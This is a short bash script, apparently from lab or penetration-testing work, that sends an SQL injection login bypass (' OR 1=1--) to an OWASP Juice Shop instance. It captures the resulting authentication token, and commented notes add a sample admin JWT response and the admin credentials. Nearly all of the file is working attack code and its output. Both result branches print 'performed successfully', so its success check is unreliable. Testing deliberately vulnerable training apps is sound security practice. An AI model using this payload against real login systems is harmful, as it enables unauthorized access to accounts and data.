#! /bin/bash

ATTACK_TARGET_IP="10.0.1.2"
ATTACK_PORT="3000"

RESPONSE=$(curl -s -X POST "http://$ATTACK_TARGET_IP:$ATTACK_PORT/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{
        "email": "'\'' OR 1=1--",
        "password": "test"
    }')

RESULT=$? 

TOKEN=$(echo "$RESPONSE" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

echo "➡️ SQL Inj Response: $RESPONSE"

if [[ -n "$TOKEN" && $RESULT -eq 0 ]]; then
    echo "✅ SQL Injection performed successfully. Exit code is 0."
else
    echo "❌ SQL Injection performed successfully. Exit code is NOT 0!"
fi



# ###########################################################################################################################################
# curl -X POST "http://localhost:3000/rest/user/login" \
#     -H "Content-Type: application/json" \
#     -d '{"email": "'\'' OR true--", "password": "test"}'


# # {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDItMTYgMDQ6Mzg6MTIuNjk5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDItMTYgMDQ6Mzg6MTIuNjk5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTczOTY4MDczNX0.WDyLlki9wtLrP2hlZnrKu41N4uN4JuSYkGRnZIGITW14hL-1LX54-etl8mT0_tG7EwpFRTU8TuGptbqAHKNa1radfBTq4H-Uln349XolLBYkPNM2sRvkw4BunTmEL6iG6YdFGrHLd3Awze6Usl9TZE8MN84YU362hUOCBJeJdnE","bid":1,"umail":"admin@juice-sh.op"}}   

# # http://localhost:3000/login
# # Email: ' OR true--
# # Password: test

# # Admin password:
# # admin@juice-sh.op
# # admin123